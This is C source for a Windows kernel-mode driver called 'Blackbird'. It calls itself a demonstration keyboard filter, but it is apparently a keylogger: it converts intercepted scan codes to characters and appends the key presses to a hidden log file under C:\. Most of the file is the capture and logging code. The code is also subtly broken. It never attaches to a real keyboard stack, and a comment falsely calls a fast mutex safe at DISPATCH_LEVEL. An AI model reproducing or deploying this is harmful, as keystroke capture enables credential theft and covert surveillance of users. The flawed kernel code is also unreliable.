/*
 * Blackbird Kernel-Space Driver
 * Windows keyboard filter driver implementation
 * 
 * Note: This is a simplified demonstration driver. A production-ready keyboard
 * filter driver requires proper PnP handling, device attachment, and IRQL management.
 * This implementation creates a standalone logging device rather than filtering
 * an existing keyboard device stack.
 */

#include <ntddk.h>
#include <kbdmou.h>
#include <ntddkbd.h>

// Driver name and device name
#define DEVICE_NAME L"\\Device\\BlackbirdDriver"
#define DOSDEVICE_NAME L"\\DosDevices\\BlackbirdDriver"
#define LOG_FILE_PATH L"\\??\\C:\\blackbird_kernel.log"
#define BUFFER_SIZE 1024
#define FLUSH_THRESHOLD_MARGIN 100

// Driver context structure
typedef struct _DEVICE_EXTENSION {
    PDEVICE_OBJECT LowerDeviceObject;
    UNICODE_STRING LogFilePath;
    HANDLE LogFileHandle;
    FAST_MUTEX LogMutex;  // Changed from KSPIN_LOCK to FAST_MUTEX for proper IRQL
    PWCHAR LogBuffer;     // Changed to pointer for dynamic allocation
    ULONG BufferIndex;
    ULONG BufferSize;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

// Function declarations
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
__drv_dispatchType(IRP_MJ_CREATE) DRIVER_DISPATCH DispatchCreate;
__drv_dispatchType(IRP_MJ_CLOSE) DRIVER_DISPATCH DispatchClose;
__drv_dispatchType(IRP_MJ_READ) DRIVER_DISPATCH DispatchRead;
IO_COMPLETION_ROUTINE ReadCompletionRoutine;

NTSTATUS WriteToLogFile(PDEVICE_EXTENSION DeviceExtension, PCWSTR Buffer, ULONG Length);
NTSTATUS FlushLogBuffer(PDEVICE_EXTENSION DeviceExtension);

// Scan code to character mapping (simplified US keyboard layout)
const WCHAR ScanCodeToChar[256] = {
    0, 0, L'1', L'2', L'3', L'4', L'5', L'6', L'7', L'8', L'9', L'0', L'-', L'=', 0, 0,
    L'q', L'w', L'e', L'r', L't', L'y', L'u', L'i', L'o', L'p', L'[', L']', L'\n', 0, L'a', L's',
    L'd', L'f', L'g', L'h', L'j', L'k', L'l', L';', L'\'', L'`', 0, L'\\', L'z', L'x', L'c', L'v',
    L'b', L'n', L'm', L',', L'.', L'/', 0, 0, 0, L' '
};

// Driver entry point
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    NTSTATUS status;
    UNICODE_STRING deviceName;
    UNICODE_STRING dosDeviceName;
    PDEVICE_OBJECT deviceObject = NULL;
    PDEVICE_EXTENSION deviceExtension = NULL;

    UNREFERENCED_PARAMETER(RegistryPath);

    KdPrint(("Blackbird: DriverEntry called\n"));

    // Initialize device name
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);

    // Create device object
    status = IoCreateDevice(
        DriverObject,
        sizeof(DEVICE_EXTENSION),
        &deviceName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Blackbird: Failed to create device: 0x%X\n", status));
        return status;
    }

    // Create symbolic link
    status = IoCreateSymbolicLink(&dosDeviceName, &deviceName);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Blackbird: Failed to create symbolic link: 0x%X\n", status));
        IoDeleteDevice(deviceObject);
        return status;
    }

    // Initialize device extension
    deviceExtension = (PDEVICE_EXTENSION)deviceObject->DeviceExtension;
    RtlZeroMemory(deviceExtension, sizeof(DEVICE_EXTENSION));
    ExInitializeFastMutex(&deviceExtension->LogMutex);
    deviceExtension->BufferSize = BUFFER_SIZE;
    deviceExtension->BufferIndex = 0;
    
    // Allocate log buffer from non-paged pool
    deviceExtension->LogBuffer = (PWCHAR)ExAllocatePoolWithTag(
        NonPagedPool,
        BUFFER_SIZE * sizeof(WCHAR),
        'gblB'  // 'Bblg' reversed
    );
    
    if (!deviceExtension->LogBuffer) {
        KdPrint(("Blackbird: Failed to allocate log buffer\n"));
        IoDeleteSymbolicLink(&dosDeviceName);
        IoDeleteDevice(deviceObject);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    RtlInitUnicodeString(&deviceExtension->LogFilePath, LOG_FILE_PATH);

    // Set dispatch routines
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
    DriverObject->DriverUnload = DriverUnload;

    // Open log file
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    
    InitializeObjectAttributes(
        &objectAttributes,
        &deviceExtension->LogFilePath,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL,
        NULL
    );

    status = ZwCreateFile(
        &deviceExtension->LogFileHandle,
        FILE_APPEND_DATA | SYNCHRONIZE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Blackbird: Failed to create log file: 0x%X\n", status));
        KdPrint(("Blackbird: Logging will be disabled\n"));
        deviceExtension->LogFileHandle = NULL;
    } else {
        KdPrint(("Blackbird: Log file created successfully\n"));
    }

#if DBG
    KdPrint(("Blackbird: Driver loaded successfully\n"));
#endif
    return STATUS_SUCCESS;
}

// Driver unload routine
VOID DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNICODE_STRING dosDeviceName;
    PDEVICE_EXTENSION deviceExtension;

#if DBG
    KdPrint(("Blackbird: DriverUnload called\n"));
#endif

    // Flush remaining log data
    if (DriverObject->DeviceObject) {
        deviceExtension = (PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension;
        
        if (deviceExtension) {
            FlushLogBuffer(deviceExtension);
            
            // Close log file
            if (deviceExtension->LogFileHandle) {
                ZwClose(deviceExtension->LogFileHandle);
            }
            
            // Free log buffer
            if (deviceExtension->LogBuffer) {
                ExFreePoolWithTag(deviceExtension->LogBuffer, 'gblB');
            }
        }
    }

    // Delete symbolic link
    RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
    IoDeleteSymbolicLink(&dosDeviceName);

    // Delete device
    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }

#if DBG
    KdPrint(("Blackbird: Driver unloaded\n"));
#endif
}

// Create dispatch routine
NTSTATUS DispatchCreate(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

#if DBG
    KdPrint(("Blackbird: DispatchCreate called\n"));
#endif

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// Close dispatch routine
NTSTATUS DispatchClose(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PDEVICE_EXTENSION deviceExtension;

#if DBG
    KdPrint(("Blackbird: DispatchClose called\n"));
#endif

    deviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
    FlushLogBuffer(deviceExtension);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// Read dispatch routine (keyboard filter)
// Note: This is a simplified demonstration. A proper filter driver would
// attach to the keyboard device stack using IoAttachDeviceToDeviceStack.
NTSTATUS DispatchRead(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PDEVICE_EXTENSION deviceExtension;
    PIO_STACK_LOCATION currentStack;

    deviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
    currentStack = IoGetCurrentIrpStackLocation(Irp);

    // If we have a lower device, set up completion and forward
    if (deviceExtension->LowerDeviceObject) {
        IoCopyCurrentIrpStackLocationToNext(Irp);
        IoSetCompletionRoutine(
            Irp,
            ReadCompletionRoutine,
            DeviceObject,
            TRUE,
            TRUE,
            TRUE
        );
        return IoCallDriver(deviceExtension->LowerDeviceObject, Irp);
    }
    
    // No lower device - complete the IRP with no data
    Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_INVALID_DEVICE_REQUEST;
}

// Read completion routine - intercepts keyboard data
// Note: This runs at DISPATCH_LEVEL, so we queue file I/O work items
NTSTATUS ReadCompletionRoutine(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp,
    _In_ PVOID Context
)
{
    PDEVICE_EXTENSION deviceExtension;
    PKEYBOARD_INPUT_DATA keyData;
    ULONG numKeys;
    ULONG i;
    WCHAR mappedChar;

    UNREFERENCED_PARAMETER(Context);

    if (Irp->IoStatus.Status == STATUS_SUCCESS) {
        deviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
        keyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        numKeys = (ULONG)(Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));

        for (i = 0; i < numKeys; i++) {
            // Only log key presses, not releases
            if (keyData[i].Flags == KEY_MAKE || keyData[i].Flags == 0) {
                USHORT scanCode = keyData[i].MakeCode;
                
                // Convert scan code to character (simplified)
                if (scanCode < 60) {  // Only process mapped scan codes
                    mappedChar = ScanCodeToChar[scanCode];
                    
                    if (mappedChar != 0 && deviceExtension->LogBuffer) {
                        // Use mutex for synchronization (safe at DISPATCH_LEVEL)
                        ExAcquireFastMutex(&deviceExtension->LogMutex);
                        
                        if (deviceExtension->BufferIndex < deviceExtension->BufferSize - 1) {
                            deviceExtension->LogBuffer[deviceExtension->BufferIndex++] = mappedChar;
                        }
                        
                        // Check if buffer needs flushing
                        // Note: We can't flush here directly due to IRQL restrictions
                        // In a production driver, use work items or DPC for file I/O
                        BOOLEAN needsFlush = (deviceExtension->BufferIndex >= 
                                              deviceExtension->BufferSize - FLUSH_THRESHOLD_MARGIN);
                        
                        ExReleaseFastMutex(&deviceExtension->LogMutex);

#if DBG
                        KdPrint(("Blackbird: Key: %wc (scan: 0x%X)\n", mappedChar, scanCode));
#endif
                        // In a real driver, queue a work item here if needsFlush is TRUE
                        // This simplified version may lose data if buffer fills up
                    }
                }
            }
        }
    }

    // If Irp->PendingReturned is set, we must call IoMarkIrpPending
    if (Irp->PendingReturned) {
        IoMarkIrpPending(Irp);
    }

    return STATUS_SUCCESS;
}

// Write data to log file
NTSTATUS WriteToLogFile(
    _In_ PDEVICE_EXTENSION DeviceExtension,
    _In_ PCWSTR Buffer,
    _In_ ULONG Length
)
{
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatusBlock;

    if (!DeviceExtension->LogFileHandle) {
        return STATUS_INVALID_HANDLE;
    }

    status = ZwWriteFile(
        DeviceExtension->LogFileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        (PVOID)Buffer,
        Length * sizeof(WCHAR),
        NULL,
        NULL
    );

    return status;
}

// Flush log buffer to file
// Note: This function must be called at PASSIVE_LEVEL IRQL
NTSTATUS FlushLogBuffer(
    _In_ PDEVICE_EXTENSION DeviceExtension
)
{
    NTSTATUS status = STATUS_SUCCESS;
    PWCHAR tempBuffer = NULL;
    ULONG bufferSize;

    // Allocate temporary buffer from paged pool (we're at PASSIVE_LEVEL)
    tempBuffer = (PWCHAR)ExAllocatePoolWithTag(
        PagedPool,
        DeviceExtension->BufferSize * sizeof(WCHAR),
        'pmtB'  // 'Btmp' reversed
    );
    
    if (!tempBuffer) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    ExAcquireFastMutex(&DeviceExtension->LogMutex);
    
    if (DeviceExtension->BufferIndex > 0) {
        // Copy to temp buffer
        RtlCopyMemory(tempBuffer, DeviceExtension->LogBuffer, 
                      DeviceExtension->BufferIndex * sizeof(WCHAR));
        bufferSize = DeviceExtension->BufferIndex;
        
        // Clear the buffer
        DeviceExtension->BufferIndex = 0;
        
        ExReleaseFastMutex(&DeviceExtension->LogMutex);
        
        // Write to file (outside mutex)
        status = WriteToLogFile(DeviceExtension, tempBuffer, bufferSize);
        
#if DBG
        if (NT_SUCCESS(status)) {
            KdPrint(("Blackbird: Flushed %lu characters to log\n", bufferSize));
        } else {
            KdPrint(("Blackbird: Failed to flush log: 0x%X\n", status));
        }
#endif
    } else {
        ExReleaseFastMutex(&DeviceExtension->LogMutex);
    }

    ExFreePoolWithTag(tempBuffer, 'pmtB');
    return status;
}
